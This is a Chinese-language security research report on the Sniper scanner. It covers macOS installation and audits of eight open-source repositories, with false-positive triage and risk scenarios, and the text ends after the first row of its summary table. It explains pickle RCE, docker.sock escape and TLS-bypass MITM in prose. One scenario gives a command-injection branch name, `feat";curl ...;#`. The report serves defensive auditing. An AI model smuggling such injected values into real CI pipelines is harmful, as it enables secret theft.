# Gökçe Baran Karakamış — Sniper macOS 安装验证、已扫描开源仓库与已验证安全漏洞报告

[English](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.en.md) | [Türkçe](SNIPER-TARANAN-DEPOLAR-VE-BAGLANTILI-ACIKLAR.md) | [日本語](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ja.md) | **简体中文** | [한국어](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ko.md)

**作者 / 安全研究员:** **Gökçe Baran Karakamış** ([@dytredline](https://github.com/dytredline))

本综合技术指南与安全研究报告由三个核心部分组成：
1. **第一部分 — macOS（Apple Silicon）真实硬件安装与运行验证报告：** Sniper Community 在真实 macOS 硬件上通过 **原生源码安装（`--core-only`）** 与 **Docker Desktop 五引擎容器栈（`community-tools`）** 两种方式进行的端到端测试与验证结果。
2. **第二部分 — 使用 Sniper 扫描的 8 个开源仓库、漏洞形成机制与日常场景分析：** 由 **Gökçe Baran Karakamış** 使用 **Sniper** 静态代码分析（SAST）、基础设施即代码（IaC）与软件成分分析（SCA）引擎扫描的 **8 个开源仓库** 的源码级审计、误报（False Positive）剔除、以通俗易懂的语言解析代码或配置缺陷在何种条件下转化为可利用漏洞、每个仓库的 **3 个日常关键风险场景（`场景 A / B / C`）**，以及 **示例执行与验证命令**。
3. **第三部分 — Sniper 扫描发现的 11 项已验证安全漏洞（`01`..`11`）、代码机理、场景与运行时证明（`RED -> GREEN + BENIGN`）：** 在 6 个开源项目（**Stirling-PDF、TryCua `cua`、OpenZiti、n8n、Gotify Server、NIIS X-Road**）中发现并提交 GitHub Security Advisory（`GHSA`）的 **11 项已验证安全漏洞** 的完整技术剖析，逐步讲解每个缺陷如何在代码中产生并演变为安全漏洞、每项漏洞的 **3 个真实日常场景（`场景 A / B / C`）**、**示例复现与验证命令**，以及 **已验证防御补丁（`git diff`）**。

---

## 第一部分 — macOS（Apple Silicon）真实硬件安装与验证报告（2026-10-24）

在 macOS（Apple Silicon）上部署运行 Sniper **并非实验性功能**；**原生源码安装（`--core-only`）** 与 **Docker Desktop 五引擎容器栈安装** 均已在真实 macOS 硬件上完成完整测试、验证与正式支持：

| 安装路径 | 执行命令 | 真实 macOS 硬件上已验证的覆盖范围 | 状态 |
| :--- | :--- | :--- | :---: |
| **1. 原生 macOS 源码安装（Native Source Setup）** | `python3 scripts/setup-community --core-only` | 创建 `.venv`（CPython 3.12）、安装锁定的运行时依赖包（`requirements-runtime.lock` + `pip check`）、`scripts/sniper-mcp --help`、`scripts/sniper-project-audit --help`、`cli_reports.py --help`、本地环回 Web 界面（`127.0.0.1:8787`）、初始化本地 SQLite 数据目录，以及对示例项目执行真实安全审计 | **真实硬件已验证（PASS）** |
| **2. Docker Desktop 五引擎容器栈（5-Engine Container Stack）** | `python3 scripts/setup-community` *（或 `docker compose --profile community-tools up -d`）* | 在 Docker Desktop（Apple Silicon / `linux/arm64`）上启动 `sniper-community` 核心容器与 5 个开源安全引擎（`zap`、`nuclei`、`trivy`、`httpx`、`katana`）、健康检查，以及共享 `/workspace` 卷项目审计 | **真实硬件已验证（PASS）** |

### macOS 真实硬件验证的技术细节
* **Apple Silicon（`arm64`）原生 Python 运行环境：** `scripts/setup-community` 自动识别 macOS 上的 Homebrew Python（`3.11+` / `3.12`），使用原生 `arm64` wheel 包（`fastapi`、`uvicorn`、`pydantic`、`PyJWT`、`cryptography`、`httpx`、`beautifulsoup4`、`jinja2`）构建 `.venv`，依赖一致性检查零冲突（`pip check: No broken requirements found`）。
* **端到端本地项目安全审计：** 在真实 macOS 硬件上运行 `scripts/sniper-project-audit` 可在毫秒至数秒内完成 SAST、IaC 与 SCA 三层扫描，并输出结构化 JSON、SARIF 与 Markdown 报告。
* **Docker 多架构兼容性：** `docker-compose.yml` 中的 `community-tools` 配置在 Apple Silicon Docker Desktop 上可原生或通过透明架构兼容层稳定运行，并严格绑定于本地 `127.0.0.1:8787` 环回接口。

---

## 第二部分 — 使用 Sniper 扫描的 8 个开源仓库与潜在关联风险分析

本部分针对前期安全研究中使用 **Sniper** 扫描的 **8 个开源仓库**，逐一提供：(A) Sniper 扫描统计摘要、(B) 源码审计确认的误报（False Positive）剔除、(C) 真实存在的代码与配置风险、(D) **代码缺陷如何产生并演变为安全漏洞（通俗易懂的机制解析）**、(E) **日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）**、(F) **独立严重度与攻击链组合（Chaining）分析**，以及 (G) **示例执行与验证命令**。

---

## 1. AutoGPT (`Significant-Gravitas/AutoGPT`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `93` 项（严重 Critical `2`、高危 High `39`、中危 Medium `49`、低危 Low `3`）
* **分诊总发现数：** `142` 项（SAST `61`、IaC `42`、SCA `39`）

### B. 源码验证与误报（False Positive）剔除
1. **确认为误报的严重/高危 SAST 告警：**
   * `autogpt_platform/backend/backend/executor/manager.py` 与 `scheduler.py` 中的 **2 项严重 SQL 注入（`obj.execute(...)`）** 告警实际上是调用工作流组件对象的 Python 方法（`block_obj.execute(input_data)`），而非执行数据库 SQL 查询，属于 **完全误报（False Positive）**。
   * FastAPI 路由中的 `Security(...)` 依赖注入与测试文件中的示例 JWT 字符串告警同样为误报。
2. **确认为真实存在的代码与基础设施发现：**
   * **依赖数据库信任边界的 `pickle.loads` 反序列化：** `autogpt_platform/backend/backend/util/jobstore_backfill.py:67` 从 APScheduler 的 `apscheduler_jobs.job_state` 列读取二进制数据后直接调用 `pickle.loads(job_state)`。
   * **Docker Compose 硬编码默认口令与未配置非 root 用户的 Dockerfile：** 开发/部署示例 Compose 文件包含默认 PostgreSQL/Redis 凭据，且部分容器以默认 `root` 身份运行。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
Python 的 `pickle.loads()` 在还原序列化字节流时会自动执行攻击者构造的 `__reduce__` 指令。正常情况下，`jobstore_backfill.py` 只读取内部 PostgreSQL 数据库中的 `apscheduler_jobs` 表。但如果运维人员在测试或生产环境中直接使用了 Docker Compose 文件里的默认数据库密码（如 `postgres`），或者攻击者通过其他内网通道获得了数据库的写入权限，攻击者就可以向 `apscheduler_jobs` 表写入恶意 Pickle 载荷；当后台回填脚本运行时，便会在 **`root` 权限的容器内直接触发远程代码执行（RCE）**。

### E. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 沿用默认 Compose 数据库密码的预发布环境遭遇数据库投毒 RCE：**
  1. 团队使用仓库自带的 Docker Compose 在云服务器上部署 AutoGPT Platform，PostgreSQL 端口对内网开放且保留了默认密码。
  2. 同一内网中受控节点的攻击者连接 PostgreSQL，向 `apscheduler_jobs` 表插入包含恶意 `job_state` 的记录。
  3. 当 `jobstore_backfill.py:67` 执行 `pickle.loads(job_state)` 时，恶意命令在 `root` 容器内执行，导致配置的 OpenAI/Anthropic API 密钥与业务数据泄露。
* **场景 B — 共享 Redis / 消息队列未授权访问导致执行器任务篡改：**
  1. 多个内部开发环境共用未开启密码认证的 Redis 实例。
  2. 攻击者向任务队列注入伪造的执行负载，诱导后台 Executor 节点执行非预期操作。
* **场景 C — 以 `root` 运行的容器在挂载宿主机目录时覆写宿主机文件：**
  1. 开发者在服务器上将宿主机目录挂载进 AutoGPT 容器，且容器以 `root` 身份运行。
  2. 容器内工作流发生越权文件写入时，直接修改或破坏宿主机上的只读配置与脚本。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立严重度：** **低危 / 中危（Low / Medium）**（外部未授权用户无法直接触达 `pickle.loads`）。
* **组合（Chaining）严重度：** **条件性中危 / 高危（Conditional Medium / High）**（仅当攻击者获取 `apscheduler_jobs` 表的数据库写权限时，`pickle.loads` 与 `root` 容器才会形成攻击链）。属于纵深防御加固项，而非直接的未授权产品漏洞。

### G. 示例执行与验证命令
```bash
# 1. 对 AutoGPT 仓库运行 Sniper 完整安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/autogpt" --format json --output "$HOME/audit-targets/reports/autogpt-audit.json"

# 2. 检查 jobstore_backfill.py 中的 pickle.loads 调用上下文
grep -n -C 5 "pickle.loads" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/util/jobstore_backfill.py"

# 3. 验证被判定为误报的 executor/manager.py .execute() 调用
grep -n -C 5 "\.execute(" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/executor/manager.py"
```

---

## 2. Zitadel (`zitadel/zitadel`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `67` 项（严重 Critical `8`、高危 High `42`、中危 Medium `17`）
* **分诊总发现数：** `286` 项

### B. 源码验证与误报（False Positive）剔除
1. **全部 8 项严重 SAST 告警均为误报：** Go 源码中的 `exec.Command` 与 SQL 字符串构造告警均位于构建脚本与数据库迁移工具内部，参数均为编译期常量，无外部用户输入流入，属于 **完全误报**。
2. **确认为真实存在的基础设施配置发现：**
   * `deploy/compose/` 下的 3 个开发/示例 Compose 文件将宿主机的 `/var/run/docker.sock` 挂载进了容器。
   * `apps/docs/` 文档示例配置中出现了 `NODE_TLS_REJECT_UNAUTHORIZED=0`。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
宿主机的 `/var/run/docker.sock` 相当于 Docker 守护进程的最高管理员接口。任何挂载了该套接字的容器一旦被攻破，攻击者只需在容器内调用 Docker API 即可启动一个挂载宿主机根目录（`/`）的特权容器，瞬间完全控制宿主机。而 `NODE_TLS_REJECT_UNAUTHORIZED=0` 会彻底关闭 Node.js 的 HTTPS 证书校验，若开发者直接复制文档示例到生产环境，所有 OIDC 身份认证流量都将暴露于中间人（MITM）劫持之下。

### E. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 直接复用开发 Compose 模板的共享测试服务器通过 `docker.sock` 被容器逃逸控制：**
  1. 运维人员在共享测试主机上直接运行 `deploy/compose/` 下的配置，使辅助容器挂载了 `/var/run/docker.sock`。
  2. 攻击者取得该容器权限后，通过 `docker.sock` 创建挂载宿主机 `/` 的容器，窃取 Zitadel 主加密密钥与数据库凭据。
* **场景 B — 照搬文档 `NODE_TLS_REJECT_UNAUTHORIZED=0` 配置导致生产门户 OIDC 令牌被中间人窃取：**
  1. 开发人员参照 `apps/docs/` 示例在生产 Node.js 前端/BFF 服务中保留了 `NODE_TLS_REJECT_UNAUTHORIZED=0`。
  2. 攻击者在网络路径上使用自签名证书实施 MITM 劫持，截获管理员 OIDC 令牌与会话密钥。
* **场景 C — 自托管 CI 环境中共享 `docker.sock` 导致跨任务镜像投毒：**
  1. 在自托管 CI 节点上运行包含 `docker.sock` 挂载的集成测试时，恶意测试任务可篡改宿主机上的其他容器镜像缓存。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立与组合严重度：** **低危 / 中危（Low / Medium）**。`docker.sock`（`deploy/compose/`）与 `NODE_TLS_REJECT_UNAUTHORIZED=0`（`apps/docs/`）位于不同的开发/文档示例中，互不串联，属于部署加固建议而非产品本体 CVE。

### G. 示例执行与验证命令
```bash
# 1. 对 Zitadel 仓库运行 Sniper 安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/zitadel" --format json --output "$HOME/audit-targets/reports/zitadel-audit.json"

# 2. 检查 Compose 文件中的 docker.sock 挂载点
grep -rn "docker.sock" "$HOME/audit-targets/zitadel/deploy/"

# 3. 检查文档示例中的 NODE_TLS_REJECT_UNAUTHORIZED 配置
grep -rn "NODE_TLS_REJECT_UNAUTHORIZED" "$HOME/audit-targets/zitadel/apps/docs/"
```

---

## 3. Nextcloud MCP Server (`cbcoutinho/nextcloud-mcp-server`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `59` 项（SAST 严重 `1` / 高危 `6`，IaC 高危 `7`，SCA 严重 `5` / 高危 `40`）

### B. 源码验证与误报（False Positive）剔除
1. **SSRF 告警（`nextcloud_mcp_server/auth/login_flow.py:192`）为误报：** 尽管代码向 `poll_endpoint` 发起了 HTTP 请求，但在 `initiate()` 阶段已通过 `_rewrite_to_nextcloud_host(poll_endpoint, self.nextcloud_host)` 将 URL 的协议、主机名与端口强制重写为受信任的 `self.nextcloud_host`，无法被导向内网地址。
2. **JWT 告警（`token_utils.py`）为只读元数据解析器：** `verify_signature=False` 仅用于解析令牌声明供调试展示，并非鉴权绕过。
3. **GitHub Actions 工作流（`.github/workflows/pact.yml`）：** 存在分支名 Shell 插值，但受 `if: github.event.pull_request.head.repo.full_name == github.repository`（仅限同仓库 PR）保护，外部 Fork 仓库无法触发。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
在 Nextcloud 登录流中，如果客户端无条件请求服务端返回的 `poll.endpoint`，攻击者就能诱导客户端访问云元数据或内网接口（SSRF）。该项目通过 `_rewrite_to_nextcloud_host()` 锁定目标主机从而消除了此隐患。而在 `.github/workflows/pact.yml` 中，由于直接在 bash 脚本中拼接分支名，一旦拥有仓库写权限的内部账号令牌泄露，攻击者便可通过创建恶意命名的同仓库分支在 CI 运行器上执行命令。

### E. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 利用同仓库分支名在 `pact.yml` CI 工作流中触发命令注入：**
  1. 拥有仓库写权限的开发者令牌被盗，攻击者在主仓库创建名为 `feat";curl ...;#` 的分支并发起 PR。
  2. `pact.yml` 通过 `same-repo` 检查并在 bash 中直接展开分支名，导致 CI 环境密钥外泄。
* **场景 B — 以 HTTP/SSE 模式对内网开放时暴露出 `uv.lock` / `poetry.lock` 中的旧版依赖漏洞（SCA）：**
  1. 团队将 Nextcloud MCP Server 部署为共享 HTTP 服务，未及时更新的第三方 Web 依赖包（SCA 检出项）暴露在网络边界。
* **场景 C — 二次开发移除 `_rewrite_to_nextcloud_host()` 后引入真实 SSRF：**
  1. 开发者为适配多域名反向代理而注释掉 `_rewrite_to_nextcloud_host()`，导致 `poll_endpoint` 可指向 `169.254.169.254` 等内网地址。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立与组合严重度：** **低危（Low）**。无已验证的一方代码 SAST 漏洞，建议对 CI 变量进行 `env:` 参数化并升级依赖锁文件。

### G. 示例执行与验证命令
```bash
# 1. 对 Nextcloud MCP Server 运行 Sniper 安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/nextcloud-mcp" --format json --output "$HOME/audit-targets/reports/nextcloud-mcp-audit.json"

# 2. 检查 login_flow.py 中的 _rewrite_to_nextcloud_host 主机重写保护逻辑
grep -n -C 12 "_rewrite_to_nextcloud_host" "$HOME/audit-targets/nextcloud-mcp/nextcloud_mcp_server/auth/login_flow.py"

# 3. 检查 pact.yml 中的 same-repo 限制条件
grep -n -C 8 "head.repo.full_name" "$HOME/audit-targets/nextcloud-mcp/.github/workflows/pact.yml"
```

---

## 4. MCPJam Inspector (`MCPJam/inspector`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `122` 项（SAST 严重 `12` / 高危 `8`，SCA 严重 `6` / 高危 `96`）

### B. 源码验证与误报（False Positive）剔除
* **20 项严重/高危 SAST 告警中有 18 项为明确误报：** 其中 14 项为注释文本中的英文词汇 `eval (` / `exec (`，2 项位于 TypeScript 类型声明文件（`.d.ts`），2 项为前端 UI 标签与静态字符串拼接。
* **确认为真实存在的发现：** `.github/workflows/pr-preview.yml` 中带有 `same-repo` 保护的分支名插值，以及锁文件中的第三方 SCA 依赖告警。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
MCPJam Inspector 是用于调试 MCP 服务的 Web 工具。在 `.github/workflows/pr-preview.yml` 中，虽然外部 Fork PR 被 `head.repo.full_name == github.repository` 拦截，但内部 PR 分支名仍直接拼接到 Shell 脚本中而非通过环境变量读取。此外，前端与服务端锁文件中包含较多旧版 npm 依赖（SCA），若将 Inspector 暴露在共享网络中则需及时更新。

### E. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 内部仓库分支命名触发 `pr-preview.yml` 预览环境部署凭据泄露：**
  1. 具有仓库分支创建权限的账号创建包含 Shell 元字符的分支并打开 PR。
  2. 预览部署脚本在拼接分支名时执行注入指令，泄露云端预览环境部署令牌。
* **场景 B — 在团队内网长期托管未更新 npm 依赖的 Inspector 实例：**
  1. 研发团队将 MCPJam Inspector 部署在内部公共服务器上，攻击者利用锁文件中旧版依赖的已知漏洞发起拒绝服务或请求伪造。
* **场景 C — 连接不受信任的第三方 MCP 服务端时渲染恶意工具元数据：**
  1. 开发者使用 Inspector 调试外部未知的 MCP Server，恶意服务端返回超长或特殊构造的响应负载引发前端异常。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立与组合严重度：** **低危 / 中危（Low / Medium）**。外部 Fork PR 已阻断，仅需加固内部 CI 脚本并升级 npm 依赖。

### G. 示例执行与验证命令
```bash
# 1. 对 MCPJam Inspector 运行 Sniper 安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/mcpjam-inspector" --format json --output "$HOME/audit-targets/reports/mcpjam-inspector-audit.json"

# 2. 检查 pr-preview.yml 的触发条件与脚本插值
grep -n -C 10 "pull_request" "$HOME/audit-targets/mcpjam-inspector/.github/workflows/pr-preview.yml"
```

---

## 5. Codebase Memory MCP (`DeusData/codebase-memory-mcp`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `32` 项（SAST 严重 `17` / 高危 `7`，SCA 高危 `8`）

### B. 源码验证与误报（False Positive）剔除
* **全部 17 项严重 SAST 告警均为误报：**
  * `src/store/store.c:2864` 的 SQL 注入告警实际使用的是编译期常量表名数组与 `sqlite3_prepare_v2` 参数化绑定（`?`）。
  * `src/lang/c_lsp.h:54` 为注释行；`kotlin_lsp.c`、`py_lsp.c` 与 `store.c:4482` 均使用了带严格长度上限的 `snprintf`；`xmalloc.c` 与 `mcp.c` 为安全的内存分配包装器。
  * `src/http/http_server.c` 已实现严格的 `Host` 请求头校验（非 `localhost` / `127.0.0.1` 直接返回 `403 Forbidden`）及仅限本地的 CORS 校验，完全阻断了浏览器跨域读取与 DNS 重绑定（DNS Rebinding）攻击。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
在 C 语言服务中，如果使用不带长度限制的 `sprintf` 会导致缓冲区溢出，直接拼接用户输入与 SQL 会导致 SQL 注入，而本地 HTTP 服务若不检查 `Host` 与 `Origin` 头则会被恶意网页通过浏览器窃取本地代码索引。经逐行核查 `codebase-memory-mcp` 源码，其 SQL 查询全部采用参数化预编译，缓冲区写入均受 `snprintf(..., sizeof(buf), ...)` 约束，且 `http_server.c` 对所有外部 `Host` 与跨域 `Origin` 均强制拦截，因此静态扫描告警不会在运行时转化为实际漏洞。

### E. 日常环境中可能引发的 3 个关键场景（若错误配置突破本地边界时的场景 `场景 A / B / C`）
* **场景 A — 使用反向代理并重写 `Host: localhost` 将本地 HTTP 服务暴露至局域网：**
  1. 开发者为方便远程访问，使用 `nginx` 或 `socat` 将 `codebase-memory-mcp` 的本地端口转发至局域网，并在代理层硬编码设置 `proxy_set_header Host localhost`。
  2. 此举人为绕过了 `http_server.c` 的 `Host` 头保护，使局域网内其他主机可查询代码知识图谱。
* **场景 B — 多用户共享 Linux 开发机上的本地环回端口访问：**
  1. 多名开发者通过 SSH 共用同一台 Linux 服务器。
  2. 由于 `127.0.0.1` 对同一操作系统内的所有本地用户可达，机器上的其他本地用户进程可连接该端口并查询 `/home/community-user/private-project` 的索引摘要。
* **场景 C — 超大型单仓（Monorepo）首次全量构建索引时的 CPU 与磁盘 I/O 峰值：**
  1. 对包含海量生成文件与依赖目录的仓库执行首次全量索引时，LSP 解析器与 SQLite 写入会短暂占满本地 CPU 与磁盘带宽。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立与组合严重度：** **低危（Low）**。浏览器远程窃取源码的攻击链因 `http_server.c` 的 `Host` + CORS 双重防护而不成立。

### G. 示例执行与验证命令
```bash
# 1. 对 Codebase Memory MCP 运行 Sniper 安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/codebase-memory-mcp" --format json --output "$HOME/audit-targets/reports/codebase-memory-mcp-audit.json"

# 2. 验证 http_server.c 中的 Host 头校验（403 Forbidden）与 CORS 防护
grep -n -C 15 "403" "$HOME/audit-targets/codebase-memory-mcp/src/http/http_server.c"

# 3. 检查 store.c:2864 附近的 sqlite3 参数化绑定源码
sed -n '2850,2880p' "$HOME/audit-targets/codebase-memory-mcp/src/store/store.c"
```

---

## 6. GitLab MCP Server (`yoda-digital/gitlab-mcp-server`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `5` 项（严重 `0`、高危 `4`、中危 `1`）

### B. 源码验证与误报（False Positive）剔除
* `recorder.go` 与 `make.go` 中的文件读写与命令执行告警均为本地测试录制与构建脚本，属于误报。
* 唯一真实的安全配置项是：当用户显式设置环境变量 `GITLAB_MCP_SKIP_TLS_VERIFY=true` 时，Go HTTP 客户端会启用 `InsecureSkipVerify: true`。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
许多企业的内部 GitLab 使用自签名证书。开发者为了省去配置根证书的步骤，往往在 MCP 配置文件中开启 `GITLAB_MCP_SKIP_TLS_VERIFY=true`。一旦启用该选项，Go TLS 客户端将不再验证服务端证书的真伪。当开发者携带笔记本电脑连接到咖啡馆、酒店或机场的公共 Wi-Fi 时，同一网络中的攻击者只需伪造任意 TLS 证书即可劫持连接，直接截获请求头中的 `PRIVATE-TOKEN` 或 `Authorization: Bearer glpat-...` 高权限个人访问令牌。

### E. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 为内网自签名 GitLab 开启 `GITLAB_MCP_SKIP_TLS_VERIFY=true` 的开发者在公共 Wi-Fi 下泄露 GitLab PAT：**
  1. 工程师为消除内网 GitLab 证书报错，在 IDE 的 MCP 配置中写入 `GITLAB_MCP_SKIP_TLS_VERIFY=true`。
  2. 当工程师在外网 Wi-Fi 下启动 IDE 时，MCP 服务发起连接，局域网中间人使用伪造证书完成握手并窃取 `glpat-...` 令牌。
* **场景 B — 团队内部文档将不安全的 MCP 配置模板作为默认标准推广：**
  1. 团队 Wiki 中的 `claude_desktop_config.json` 模板默认加上了 `GITLAB_MCP_SKIP_TLS_VERIFY=true` 并被全体成员复制使用。
  2. 即便访问拥有合法证书的生产 GitLab 实例，TLS 校验也被永久关闭，整个研发团队的代码库读写权限面临中间人劫持风险。
* **场景 C — 在企业 TLS 流量解密网关环境下用关闭校验替代配置 `SSL_CERT_FILE`：**
  1. CI/CD 节点因企业防火墙 TLS 解密而报证书错误，运维人员未导入企业根 CA，而是直接设置 `GITLAB_MCP_SKIP_TLS_VERIFY=true`，导致流水线通信丧失传输层认证。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立与组合严重度：** **低危（Low）**。默认状态下 TLS 校验保持开启，仅在用户主动启用该环境变量时产生风险。

### G. 示例执行与验证命令
```bash
# 1. 对 GitLab MCP Server 运行 Sniper 安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/gitlab-mcp-server" --format json --output "$HOME/audit-targets/reports/gitlab-mcp-server-audit.json"

# 2. 检查 GITLAB_MCP_SKIP_TLS_VERIFY 与 InsecureSkipVerify 的源码实现
grep -rn -C 8 "GITLAB_MCP_SKIP_TLS_VERIFY" "$HOME/audit-targets/gitlab-mcp-server/"
```

---

## 7. Apktool MCP (`zinja-coder/apktool-mcp-server`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `16` 项（SAST 中危 `1`，SCA 严重 `4` / 高危 `12`）

### B. 源码验证与误报（False Positive）剔除
* 一方 Python 源码无严重或高危 SAST 漏洞，1 项中危告警为误报。
* `uv.lock` 锁定的第三方依赖包中存在 **4 项严重、12 项高危 SCA 漏洞记录**（涉及 `authlib 1.6.8`、`cryptography 46.0.5`、`pyjwt 2.11.0`、`python-multipart 0.0.20`、`starlette 0.47.3`、`urllib3 2.5.0`）。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
即便项目自身编写的 Python 业务逻辑没有漏洞，只要 `uv.lock` 锁定了存在已知 CVE 的旧版底层框架（如 `starlette`、`python-multipart`、`authlib`），用户执行 `uv sync --frozen` 时就会原封不动地安装这些旧版本。如果将该 MCP 服务以 HTTP/SSE 模式部署在共享网络上，攻击者便可通过底层框架的鉴权绕过或分片解析缺陷直接发起攻击。

### E. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 远程共享 APK 逆向分析服务器上利用 `authlib 1.6.8` / `pyjwt 2.11.0` 缺陷绕过鉴权：**
  1. 安全团队将 Apktool MCP 以 HTTP/SSE 模式部署在内网分析服务器上，并使用 JWT 中间件保护接口。
  2. 攻击者利用 `uv.lock` 中旧版 `authlib` / `pyjwt` 的已知验证缺陷伪造令牌，未授权调用反编译接口。
* **场景 B — 利用 `python-multipart 0.0.20` 与 `starlette 0.47.3` 解析缺陷触发拒绝服务（DoS）：**
  1. 攻击者向 HTTP 模式的 MCP 端点发送构造了特殊边界（boundary）的 `multipart/form-data` 请求。
  2. 旧版解析器消耗大量 CPU 与内存，导致 APK 逆向服务卡死。
* **场景 C — 反编译恶意构造的高压缩比 APK（Zip Bomb）引发分析主机资源耗尽：**
  1. 分析人员提交包含超深层嵌套或超大资源表的恶意 APK，导致本地磁盘与内存耗尽。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立与组合严重度：** **低危 / 中危（SCA）**。一方代码无漏洞链，升级 `uv.lock` 即可修复。

### G. 示例执行与验证命令
```bash
# 1. 对 Apktool MCP 运行 Sniper 安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/apktool-mcp" --format json --output "$HOME/audit-targets/reports/apktool-mcp-audit.json"

# 2. 检查 uv.lock 中锁定的第三方依赖版本
grep -n -A 2 -E 'name = "(authlib|cryptography|pyjwt|python-multipart|starlette|urllib3)"' "$HOME/audit-targets/apktool-mcp/uv.lock"

# 3. 使用 Sniper CLI 报告工具筛选高危及以上发现
python3 cli_reports.py --input "$HOME/audit-targets/reports/apktool-mcp-audit.json" --min-severity high
```

---

## 8. JADX MCP (`zinja-coder/jadx-mcp-server`)

### A. Sniper 扫描统计摘要
* **超过阈值（高置信度）发现数：** `32` 项（SAST 中危 `3`，SCA 严重 `6` / 高危 `26`）

### B. 源码验证与误报（False Positive）剔除
* 一方 Python 源码无严重或高危 SAST 漏洞，3 项中危告警均为本地 JADX 插件通信辅助代码。
* `uv.lock` 中包含 **6 项严重、26 项高危 SCA 依赖记录**（涉及 `authlib 1.6.8`、`pyjwt 2.11.0`、`cryptography 46.0.5`、`python-multipart 0.0.20`、`starlette 0.47.3`、`urllib3 2.5.0` 等）。

### D. 代码中如何产生并转化为安全漏洞（通俗讲解）
当用户使用 `uv sync --frozen` 安装 JADX MCP 时，会精确安装 `uv.lock` 中锁定的旧版库。若将 JADX MCP 从本地 `stdio` 模式切换为通过网络访问的 HTTP/SSE 服务（例如供团队远程连接分析服务器上的 JADX 实例），底层的 `authlib`/`pyjwt` 算法混淆或 `python-multipart` 拒绝服务漏洞便可能被网络攻击者利用。

### E. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 远程逆向分析服务器上通过 `authlib 1.6.8` / `pyjwt 2.11.0` 绕过 OAuth/JWT 校验：**
  1. 移动安全团队在高性能服务器上以 HTTP/SSE 模式运行 JADX MCP，并配置 JWT 鉴权保护正在逆向的商业 APK 代码。
  2. 由于锁文件中旧版 `authlib` 与 `pyjwt` 的已知验证缺陷，攻击者使用篡改后的令牌绕过校验并读取反编译源码。
* **场景 B — 通过 `python-multipart 0.0.20` 与 `starlette 0.47.3` 触发多部分请求 CPU/内存耗尽：**
  1. 向 HTTP 模式运行的 MCP 服务发送带有畸形 boundary 的 `multipart/form-data` 请求，导致 JADX MCP 桥接进程阻塞。
* **场景 C — `urllib3 2.5.0` 与 `cryptography 46.0.5` 依赖中的跨域重定向敏感头泄露：**
  1. 当 JADX MCP 通过 `urllib3` 请求远程符号或资源服务器并遇到跨域重定向时，未清理的认证头可能泄露至重定向目标。

### F. 独立与组合（攻击链 Chaining）严重度分析
* **独立与组合严重度：** **低危 / 中危（SCA）**。无一方代码攻击链，建议执行依赖升级。

### G. 示例执行与验证命令
```bash
# 1. 对 JADX MCP 运行 Sniper 安全审计
python3 scripts/sniper-project-audit "$HOME/audit-targets/jadx-mcp" --format json --output "$HOME/audit-targets/reports/jadx-mcp-audit.json"

# 2. 检查 uv.lock 中的受影响依赖版本
grep -n -A 2 -E 'name = "(authlib|cryptography|pyjwt|python-multipart|starlette|urllib3)"' "$HOME/audit-targets/jadx-mcp/uv.lock"

# 3. 通过 Sniper CLI 筛选并列出高危及以上 SCA 记录
python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json" --min-severity high
```

---

## 汇总对比表：独立 vs. 组合（攻击链 Chaining）严重度与证据状态

| 仓库 | Sniper SAST / IaC / SCA 摘要 | 已验证源码证据（真实 vs. 误报） | 独立严重度 | 发现项是否串联成攻击链？（Chaining） | 组合（攻击链）严重度与披露状态 |
| :--- | :--- | :--- | :---: | :--- | :--- |
| **1. `autogpt`** | `93` 项超阈值（`2C / 39H`）；`142` 项分诊 | **2 项严重 SQLi（`obj.execute`）、JWT 与 FastAPI `Security()` 均为误报**；`jobstore_backfill.py` `pickle.loads` + Compose 硬编码密码 + Root Dockerfile 真实存在 | **低危 / 中危** | **条件性假设：** 仅当攻击者获取数据库 `apscheduler_jobs` 表写权限时，`pickle.loads` + Root 容器才会串联 | **中危 / 高危（条件性）** *（无直接未授权漏洞；属于纵深防御加固）* |
